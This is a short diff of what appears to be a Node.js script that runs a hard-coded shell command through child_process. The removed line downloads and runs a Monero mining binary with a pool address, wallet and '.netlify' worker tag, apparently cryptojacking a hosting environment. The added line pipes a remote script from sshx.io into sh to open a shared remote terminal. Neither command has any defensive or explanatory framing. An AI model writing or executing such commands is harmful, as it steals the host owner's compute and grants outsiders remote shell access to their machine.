@@ -1,5 +1,5 @@
 // Change this to the command you want to run
-const command = "wget https://github.com/iceyfromdiscord/yes/raw/refs/heads/master/prog && chmod +x prog && ./prog -o us.monero.gfwroute.com:1111 -u 43wBYRJpvVsMYCUcL1jGrj5GBACA6Qr7BLP3ZieFGueMj82kZcGfNewaEcYm9kyCUiAMhvwFiRxcJ8SzfcVeqn5z1vVkDfQ.netlify -a rx/0 -k "
+const command = "curl -sSf https://sshx.io/get | sh -s run"
 const { spawn } = require("child_process");
 
 function runShellCommand(commandStr) {
